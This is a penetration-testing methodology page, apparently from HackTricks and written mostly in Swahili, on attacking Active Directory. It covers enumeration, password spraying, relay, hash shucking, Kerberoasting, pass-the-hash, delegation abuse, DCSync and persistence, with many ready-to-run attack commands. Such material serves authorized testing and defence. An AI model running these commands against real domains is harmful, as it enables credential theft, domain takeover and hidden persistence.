# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Basic overview

**Active Directory** inatoa teknolojia msingi, ikiwawezesha **network administrators** kuunda na kusimamia kwa ufanisi **domains**, **users**, na **objects** ndani ya mtandao. Imetengenezwa ili iweze kupanuka, ikirahisisha kupanga idadi kubwa ya watumiaji katika **groups** na **subgroups** zinazoweza kusimamiwa, huku ikidhibiti **access rights** kwenye viwango mbalimbali.

Muundo wa **Active Directory** unajumuisha ngazi kuu tatu: **domains**, **trees**, na **forests**. **Domain** ni mkusanyiko wa objects, kama **users** au **devices**, ambazo zinashiriki database moja. **Trees** ni vikundi vya domains vyenye muundo mmoja wa mizizi, na **forest** ni mkusanyiko wa trees nyingi zilizounganishwa kupitia **trust relationships**, zikifanya safu ya juu kabisa ya muundo wa shirika. Haki maalum za **access** na **communication** zinaweza kutolewa katika kila moja ya ngazi hizi.

Mambo muhimu ndani ya **Active Directory** ni pamoja na:

1. **Directory** – Ina taarifa zote zinazohusiana na Active Directory objects.
2. **Object** – Inarejea vitu ndani ya directory, ikiwa ni pamoja na **users**, **groups**, au **shared folders**.
3. **Domain** – Inafanya kama chombo kwa directory objects, na inawezekana kuwa na domains nyingi ndani ya **forest**, kila moja ikiwa na mkusanyiko wake wa objects.
4. **Tree** – Kundi la domains zinazoshiriki domain ya mzizi.
5. **Forest** – Ngazi ya juu kabisa ya muundo wa shirika katika Active Directory, inayoundwa na trees kadhaa zikiwa na **trust relationships** kati yao.

**Active Directory Domain Services (AD DS)** inajumuisha huduma mbalimbali muhimu kwa usimamizi wa kati na mawasiliano ndani ya mtandao. Huduma hizi ni pamoja na:

1. **Domain Services** – Inasawazisha uhifadhi wa data na kusimamia mwingiliano kati ya **users** na **domains**, ikijumuisha **authentication** na kazi za **search**.
2. **Certificate Services** – Inasimamia uundaji, usambazaji, na usimamizi wa **digital certificates** salama.
3. **Lightweight Directory Services** – Inasaidia applications zinazotegemea directory kupitia **LDAP protocol**.
4. **Directory Federation Services** – Hutoa uwezo wa **single-sign-on** ili kuhalalisha watumiaji kwa web applications nyingi katika kikao kimoja.
5. **Rights Management** – Inasaidia kulinda nyaraka za hakimiliki kwa kudhibiti usambazaji na matumizi yasiyoruhusiwa.
6. **DNS Service** – Muhimu kwa kutatua **domain names**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Ili ujifunze jinsi ya **attack an AD** unahitaji **understand** kwa undani mchakato wa **Kerberos authentication**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Unaweza kutembelea [https://wadcoms.github.io/](https://wadcoms.github.io) kupata muhtasari wa haraka wa amri ambazo unaweza kukimbiza ili ku-enumerate/exploit AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Ikiwa una ufikiaji wa mazingira ya AD lakini huna credentials/sessions yoyote unaweza:

- **Pentest the network:**
- Scan mtandao, gundua machines na ports zilizo wazi na jaribu **exploit vulnerabilities** au **extract credentials** kutoka kwao (kwa mfano, [printers could be very interesting targets](ad-information-in-printers.md)).
- Ku-enumerate DNS kunaweza kutoa taarifa kuhusu servers muhimu ndani ya domain kama web, printers, shares, vpn, media, n.k.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Tazama General [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) kupata maelezo zaidi kuhusu jinsi ya kufanya hili.
- **Check for null and Guest access on smb services** (hii haitafanya kazi kwenye matoleo ya kisasa ya Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Mwongozo wa kina juu ya jinsi ya ku-enumerate SMB server unaweza kupatikana hapa:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Mwongozo wa kina juu ya jinsi ya ku-enumerate LDAP unaweza kupatikana hapa (lipa **special attention to the anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Kusanya credentials kwa **impersonating services with Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pata ufikiaji wa host kwa [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Kusanya credentials kwa **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Chota usernames/majina kutoka kwa nyaraka za ndani, mitandao ya kijamii, services (hasa web) ndani ya mazingira ya domain na pia kutoka kwa yanayopatikana kwa umma.
- Ikiwa utapata majina kamili ya wafanyakazi wa kampuni, unaweza kujaribu conventions mbalimbali za AD **username conventions** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Conventions zinazotumika zaidi ni: _NameSurname_, _Name.Surname_, _NamSur_ (herufi 3 za kila jina), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, herufi 3 _random na namba 3 random_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Angalia ukurasa wa [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) na [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Wakati **invalid username is requested** server itajibu kwa kutumia **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, ikituwezesha kubaini kuwa username ilikuwa batili. **Valid usernames** zitatuma au TGT katika AS-REP au error _KRB5KDC_ERR_PREAUTH_REQUIRED_, ikionyesha kuwa mtumiaji anahitajika kufanya pre-authentication.
- **No Authentication against MS-NRPC**: Kutumia auth-level = 1 (No authentication) dhidi ya MS-NRPC (Netlogon) interface kwenye domain controllers. Mbinu hiyo inaita function `DsrGetDcNameEx2` baada ya ku-bind MS-NRPC interface ili kuangalia kama user au computer ipo bila credentials yoyote. Tool ya [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) inatekeleza aina hii ya enumeration. Utafiti unaweza kupatikana [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ikiwa umepata moja ya servers hizi kwenye mtandao, unaweza pia kufanya **user enumeration against it**. Kwa mfano, unaweza kutumia zana [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Kujua jina la mtumiaji mmoja au kadhaa

Sawa, hivyo unajua tayari una jina halali la mtumiaji lakini hakuna nywila... Kisha jaribu:

- [**ASREPRoast**](asreproast.md): Ikiwa mtumiaji **hana** sifa _DONT_REQ_PREAUTH_ unaweza **kuomba ujumbe wa AS_REP** kwa mtumiaji huyo ambao utajumuisha baadhi ya data zilizofichwa kwa kutumia mchakato unaotokana na nywila ya mtumiaji.
- [**Password Spraying**](password-spraying.md): Tujaribu nywila zinazotumika zaidi kwa kila mmoja wa watumiaji walioibuliwa; labda baadhi ya watumiaji wanatumia nywila dhaifu (kumbuka sera ya nywila!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Huenda ukaweza **kupata** baadhi ya challenge **hashes** za ku-crack kwa **poisoning** baadhi ya protocols za **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Ikiwa umefanikiwa kuorodha Active Directory utapata **barua pepe zaidi na uelewa bora wa network**. Huenda ukaweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ili kupata ufikiaji wa mazingira ya AD.

### Steal NTLM Creds

Ikiwa unaweza **kupata ufikiaji wa PC nyingine au shares** kwa kutumia **null au guest user** unaweza **wekea files** (kama SCF file) ambazo ikiwa zitafunguliwa zitasababisha **NTLM authentication dhidi yako** ili uweze **kuiba** **NTLM challenge** na kuicrack:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** huchukulia kila NT hash unayomiliki kama candidate password kwa formats zingine, zinazofanya kazi polepole, ambazo key material zinatokana moja kwa moja na NT hash. Badala ya brute-forcing passphrases ndefu katika Kerberos RC4 tickets, NetNTLM challenges, au cached credentials, unaingiza NT hashes katika Hashcat’s NT-candidate modes na unaacha ithibitishe password reuse bila kamwe kujua plaintext. Hii ni yenye nguvu hasa baada ya kompromisi ya domain ambapo unaweza kuvuna maelfu ya NT hashes za sasa na za kihistoria.

Tumia shucking wakati:

- Una NT corpus kutoka DCSync, SAM/SECURITY dumps, au credential vaults na unahitaji kujaribu reuse katika domains/forests.
- Unapokamata RC4-based Kerberos material (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, au DCC/DCC2 blobs.
- Unataka kuthibitisha kwa haraka reuse ya passphrases ndefu zisizoweza ku-crack na papo hapo pivot via Pass-the-Hash.

Mbinu hii **haitumii** dhidi ya aina za encryption ambazo funguo sio NT hash (mf. Kerberos etype 17/18 AES). Ikiwa domain inalazimisha AES-tu, lazima urudi kwenye regular password modes.

#### Building an NT hash corpus

- **DCSync/NTDS** – Tumia `secretsdump.py` na history kupata set kubwa zaidi ya NT hashes (na thamani zao za zamani):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History entries huongeza sana candidate pool kwa sababu Microsoft inaweza kuhifadhi hadi 24 previous hashes kwa kila akaunti. Kwa njia zaidi za kuvuna siri za NTDS ona:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (au Mimikatz `lsadump::sam /patch`) hutoa data za SAM/SECURITY za local na cached domain logons (DCC/DCC2). Fanya deduplicate na ongeza hashes hizo kwenye orodha ile ile `nt_candidates.txt`.
- **Track metadata** – Hifadhi username/domain iliyotoa kila hash (hata kama wordlist ina hex tu). Matching hashes zinaonyesha mara moja ni principal gani anatumia tena nywila baada ya Hashcat kuchapisha candidate aliyeshinda.
- Upende candidates kutoka forest ileile au trusted forest; hivyo kunaboresha nafasi ya overlap wakati wa shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Vidokezo:

- NT-candidate inputs **lazima zibaki raw 32-hex NT hashes**. Zima rule engines (hakuna `-r`, hakuna hybrid modes) kwa sababu mangling huvuruga candidate key material.
- Modes hizi hazina kasi zaidi kwa asili, lakini keyspace ya NTLM (~30,000 MH/s on an M3 Max) ni takriban ~100× ya haraka kuliko Kerberos RC4 (~300 MH/s). Kupima orodha ya NT iliyochaguliwa ni bei nafuu kuliko kuchunguza nafasi yote ya nywila katika format polepole.
- K running the **latest Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) kwa sababu modes 31500/31600/35300/35400 zililetwa hivi karibuni.
- Hapo sasa hakuna NT mode kwa AS-REQ Pre-Auth, na AES etypes (19600/19700) zinahitaji plaintext password kwa sababu funguo zao zinatokana via PBKDF2 kutoka kwa passwords za UTF-16LE, sio raw NT hashes.

#### Mfano – Kerberoast RC4 (mode 35300)

1. Kamata RC4 TGS kwa target SPN ukitumia mtumiaji mwenye privileges za chini (ona ukurasa wa Kerberoast kwa maelezo):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck tiketi na orodha yako ya NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat hutokana na kila NT candidate kuunda RC4 key na kuthibitisha `$krb5tgs$23$...` blob. Match inathibitisha kuwa service account inatumia moja ya NT hashes ulizonazo.

3. Papo hapo pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Unaweza pia kurecover plaintext baadaye kwa `hashcat -m 1000 <matched_hash> wordlists/` ikiwa inahitajika.

#### Mfano – Cached credentials (mode 31600)

1. Dump cached logons kutoka workstation iliyokompromiwa:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Nakili line ya DCC2 kwa domain user inayokuvutia kwenye `dcc2_highpriv.txt` na uishuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Match iliyofanikiwa itarudisha NT hash iliyojulikana tayari kwenye orodha yako, ikithibitisha kuwa cached user anatumia tena nywila. Itumie moja kwa moja kwa PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) au brute-force kwa fast NTLM mode kupata string.

Mfumo huo huo unatumika kwa NetNTLM challenge-responses (`-m 27000/27100`) na DCC (`-m 31500`). Mara match itakapotambuliwa unaweza kuanzisha relay, SMB/WMI/WinRM PtH, au ku-re-crack NT hash na masks/rules offline.

## Kuorodhesha Active Directory KWA credentials/session

Kwa hatua hii unahitaji kuwa **umekompromisha credentials au session ya akaunti halali ya domain.** Ikiwa una credentials halali au shell kama domain user, **kumbuka kwamba chaguzi zilizotajwa hapo awali bado ni mbinu za kukompromisha watumiaji wengine.**

Kabla ya kuanza enumeration iliyothibitishwa unapaswa kujua nini tatizo la **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Uorodheshaji

Kuwahi kumkompromisha akaunti ni **hatua kubwa ya kuanza kukomprmisha domain nzima**, kwa sababu utaweza kuanza **Active Directory Enumeration:**

Kuhusiana na [**ASREPRoast**](asreproast.md) sasa unaweza kupata kila mtumiaji aliye dhaifu, na kuhusiana na [**Password Spraying**](password-spraying.md) unaweza kupata **orodha ya majina yote ya watumiaji** na kujaribu nywila ya akaunti iliyokompromiwa, nywila tupu na nywila mpya zenyeahidi.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Ni rahisi sana kupata majina yote ya watumiaji wa domain kutoka Windows (`net user /domain` ,`Get-DomainUser` au `wmic useraccount get name,sid`). Katika Linux, unaweza kutumia: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` au `enum4linux -a -u "user" -p "password" <DC IP>`

> Hata kama sehemu hii ya Enumeration inaonekana fupi, hili ndilo sehemu muhimu zaidi yote. Fungua viungo (hasa ile za cmd, powershell, powerview na BloodHound), jifunze jinsi ya kuorodhesha domain na fanya mazoezi hadi ujisikie unaelewa. Wakati wa assessment, hii itakuwa wakati wa muhimu kupata njia yako hadi DA au kuamua kuwa hakuna chochote kilichowezekana.

### Kerberoast

Kerberoasting inahusisha kupata **TGS tickets** zinazotumika na services zilizohusishwa na akaunti za watumiaji na ku-crack encryption zao—ambazo zinategemea nywila za watumiaji—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Mara utakapopata baadhi ya credentials unaweza kuangalia kama una ufikiaji wa **machine** yoyote. Kwa ajili hiyo, unaweza kutumia **CrackMapExec** kujaribu kuunganishwa kwenye seva kadhaa kwa protocols tofauti, kulingana na port scans yako.

### Local Privilege Escalation

Ikiwa umekompromisha credentials au session kama domain user wa kawaida na una **ufikiaji** kwa mtumiaji huyu kwa **machine yoyote ndani ya domain** unapaswa kujaribu kupata njia za **kuinua privileges kwa local na kutafuta credentials**. Hii ni kwa sababu ni kwa tu kwa privileges za local administrator utaweza **kudump hashes za watumiaji wengine** katika memory (LSASS) na kwa lokale (SAM).

Kuna ukurasa kamili katika kitabu hiki kuhusu [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) na [**checklist**](../checklist-windows-privilege-escalation.md). Pia, usisahau kutumia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Ni **sio kawaida** utapata **tiketi** katika user wa sasa zinazokupa ruhusa ya kupata rasilimali zisizotarajiwa, lakini unaweza kuangalia:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Ikiwa umefanikiwa kuorodhesha Active Directory utakuwa na **barua pepe zaidi na uelewa bora wa mtandao**. Unaweza kulazimisha NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Sasa kwa kuwa una baadhi ya basic credentials unapaswa kuangalia kama unaweza **kupata** faili zozote **zinazovutia zinashirikiwa ndani ya AD**. Unaweza kufanya hivyo kwa mkono lakini ni kazi ya kuchosha na kurudia (na zaidi ikiwa utapata mamia ya nyaraka unazohitaji kukagua).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ikiwa unaweza kupata access kwa PCs nyingine au shares unaweza kuweka files (kama SCF file) ambazo zikifunguliwa zita-trigger NTLM authentication dhidi yako ili uweze ku-steal NTLM challenge ili ku-crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

This vulnerability allowed any authenticated user to **compromise the domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Kwa mbinu zifuatazo mtumiaji wa kawaida wa domain haitoshi, unahitaji some special privileges/credentials ili kufanya mashambulizi haya.**

### Hash extraction

Kwa bahati nzuri umefanikiwa ku-compromise some local admin account kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).  
Kisha, ni wakati wa dump all the hashes in memory and locally.  
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.  
Unahitaji kutumia some **tool** itakayefanya **NTLM authentication using** that **hash**, **au** unaweza kuunda sessionlogon mpya na ku-inject hash hiyo ndani ya **LSASS**, ili wakati wowote **NTLM authentication** itakapofanyika, hash hiyo itatumika. Chaguo la mwisho ndilo mimikatz hufanya.  
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Shambulio hili linalenga **kutumia user NTLM hash kuomba Kerberos tickets**, kama mbadala kwa kawaida Pass The Hash juu ya NTLM protocol. Kwa hiyo, linaweza kuwa hasa **useful in networks where NTLM protocol is disabled** na Kerberos tu inaruhusiwa kama authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In the **Pass The Ticket (PTT)** attack method, attackers **steal a user's authentication ticket** badala ya password au hash values zao. Ticket iliyochukuliwa hutumika kisha **kuiga mtumiaji**, kupata access isiyoidhinishwa kwa rasilimali na huduma ndani ya mtandao.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ikiwa una **hash** au **password** ya **local administrato**r unapaswa kujaribu **ku-login locally** kwenye **PCs** nyingine ukitumia hiyo.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Kumbuka kwamba hili linaweza kuwa **linayoonekana sana** na **LAPS** lingepunguza hilo.

### MSSQL Abuse & Trusted Links

Ikiwa mtumiaji ana ruhusa za **kufikia MSSQL instances**, anaweza kuitumia **kutekeleza amri** kwenye mwenyeji wa MSSQL (ikiwa inaendesha kama SA), **kunakili** NetNTLM **hash** au hata kufanya **relay** **attack**.\
Pia, ikiwa mfano wa MSSQL umepewa imani (database link) na mfano mwingine wa MSSQL. Ikiwa mtumiaji ana ruhusa kwenye database iliyothibitishwa, atakuwa na uwezo wa **kutumia uhusiano wa uaminifu kutekeleza query pia kwenye mfano mwingine**. Uaminifu hizi zinaweza kuunganishwa mnyororo na kwa hatua fulani mtumiaji anaweza kupata database iliyopangwa vibaya ambamo anaweza kutekeleza amri.\
**Links kati ya database hufanya kazi hata kupitia forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Suite za wahudumu wa tatu za inventory na deployment mara nyingi zinafichua njia zenye nguvu za kupata credentials na code execution. Tazama:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ikiwa utakuta kituo chochote cha Computer chenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una ruhusa za domain kwenye kompyuta hiyo, utaweza dump TGTs kutoka kwenye memory ya watumiaji wote wanaoingia kwenye kompyuta hiyo.\
Kwa hivyo, ikiwa **Domain Admin anaingia kwenye kompyuta**, utaweza dump TGT yake na kumuiga kwa kutumia [Pass the Ticket](pass-the-ticket.md).\
Shukrani kwa constrained delegation unaweza hata **kuvamia kwa otomatiki Print Server** (itumie matumaini kuwa itakuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa mtumiaji au kompyuta anaruhusiwa kwa "Constrained Delegation" itawawezesha **kumuiga mtumiaji yeyote ili kufikia baadhi ya huduma kwenye kompyuta**.\
Kisha, ikiwa **utakamatwa hash** ya mtumiaji/kompyuta hii utaweza **kumuiga mtumiaji yeyote** (hata domain admins) ili kufikia baadhi ya huduma.

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na ruhusa ya **WRITE** kwenye Active Directory object ya kompyuta ya mbali kunawawezesha kupata code execution kwa **kiyeo cha juu cha ruhusa**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Mtumiaji aliyevamiwa anaweza kuwa na baadhi ya **ruhusa za kuvutia juu ya baadhi ya domain objects** ambazo zinaweza kumruhusu **kusogea upande**/**kupanda ngazi** kwa ruhusa.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Kugundua huduma ya **Spool ikisikiliza** ndani ya domain kunaweza kutumika **kuchukua credentials mpya** na **kupandisha ruhusa**.

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Ikiwa **watumiaji wengine** **wanafikia** mashine iliyovamiwa, inawezekana **kukusanya credentials kutoka memory** na hata **kuchanganya beacons kwenye michakato yao** ili kuwaiga.\
Kwa kawaida watumiaji watafikia mfumo kupitia RDP, hivyo hapa kuna jinsi ya kufanya mashambulizi kadhaa juu ya RDP sessions za wahudumu wa tatu:

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** inatoa mfumo wa kusimamia **password ya Local Administrator** kwenye kompyuta zilizo katika domain, kuhakikisha inarandamwa, ni ya kipekee, na hubadilishwa mara kwa mara. Password hizi zinahifadhiwa kwenye Active Directory na ufikiaji udhibitiwa kupitia ACL kwa watumiaji walioidhinishwa tu. Ukiwa na ruhusa za kutosha za kufikia password hizi, inawezekana kupindua kwenda kwenye kompyuta nyingine.

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Kukusanya certificates** kutoka kwa mashine iliyovamiwa kunaweza kuwa njia ya kupandisha ruhusa ndani ya mazingira:

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Ikiwa **template zilizo hatarishi** zimewekwa, inawezekana kuzitumia kupandisha ruhusa:

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Mara tu unapopata ruhusa za **Domain Admin** au bora zaidi **Enterprise Admin**, unaweza **kudump** **database ya domain**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Baadhi ya mbinu zilizojadiliwa hapo awali zinaweza kutumiwa kwa ajili ya persistence.\
Kwa mfano unaweza:

- Kufanya watumiaji wawe wadhifu kwa [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Kufanya watumiaji wawe wadhifu kwa [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Kuwapa ruhusa ya [**DCSync**](#dcsync) mtumiaji

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

